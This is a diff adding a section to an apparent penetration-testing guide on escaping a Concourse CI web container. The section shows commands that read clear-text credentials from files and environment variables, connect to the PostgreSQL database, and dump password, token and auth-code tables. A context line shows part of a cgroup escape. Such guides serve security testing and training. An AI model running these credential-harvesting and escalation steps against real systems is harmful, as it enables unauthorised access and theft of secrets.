@@ -301,6 +301,46 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 cat /output
 ```
 
+### Escaping to the node from the Web container
+
+Even if the web container has some defenses disabled it's **not running as a common privileged container** (for example, you **cannot** **mount** and the **capabilities** are very **limited**, so all the easy ways to escape from the container are useless).
+
+However, it stores **local credentials in clear text**:
+
+```bash
+cat /concourse-auth/local-users
+test:test
+
+env | grep -i local_user
+CONCOURSE_MAIN_TEAM_LOCAL_USER=test
+CONCOURSE_ADD_LOCAL_USER=test:test
+```
+
+You cloud use that credentials to **login against the web server** and **create a privileged container and escape to the node**.
+
+In the environment you can also find information to **access the postgresql** instance that concourse uses (address, **username**, **password** and database among other info):
+
+```bash
+env | grep -i postg
+CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
+CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
+CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
+CONCOURSE_POSTGRES_USER=concourse
+CONCOURSE_POSTGRES_DATABASE=concourse
+CONCOURSE_POSTGRES_PASSWORD=concourse
+[...]
+
+# Access the postgresql db
+psql -h 10.107.191.238 -U concourse -d concourse
+select * from password; #Find hashed passwords
+select * from access_tokens;
+select * from auth_code;
+select * from client;
+select * from refresh_token;
+select * from teams; #Change the permissions of the users in the teams
+select * from users;
+```
+
 ### Abusing Garden Service - Not a real Attack
 
 {% hint style="warning" %}
